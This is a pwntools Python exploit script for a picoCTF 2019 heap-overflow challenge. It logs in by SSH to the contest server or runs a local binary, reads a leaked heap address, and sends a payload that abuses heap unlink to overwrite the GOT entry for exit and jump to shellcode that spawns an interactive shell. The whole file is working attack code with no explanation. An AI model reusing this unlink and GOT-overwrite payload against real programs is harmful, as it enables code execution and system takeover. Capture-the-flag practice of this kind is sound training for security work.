from pwn import *

e = ELF("./vuln")

context.binary = e.path

if "--remote" in sys.argv:
  s = ssh(host="2019shell1.picoctf.com", user="gamester543", password="")
  p = s.run("/problems/heap-overflow_2_de0f6daa62288c9b3afb950888dc7166/vuln")
else:
  p = process([e.path]
  )
  #{"LD_PRELOAD": libc.path})

p.recvuntil("decimal...")
p.recvline()

leak = int(p.recvline())
print("{:#x}".format(leak))
# Exploit unlink w/ PREV_IN_USE
p.sendline(("A" * 8 + asm("mov eax, " + str(leak + 8 + 0x10) + "\njmp eax").ljust(0x10, "\x00") + asm(shellcraft.sh())).ljust(0x2a0 - 4, "A") + (p32(0x19)).ljust(0x38, "\x03") + p32(0x11) + p32(leak + 8) + p32(e.got["exit"] - 8) + p32(0x10) + p32(0x480) + "A" * (0x480 - 4) + p32(0x11))
p.sendline("A")

p.interactive()
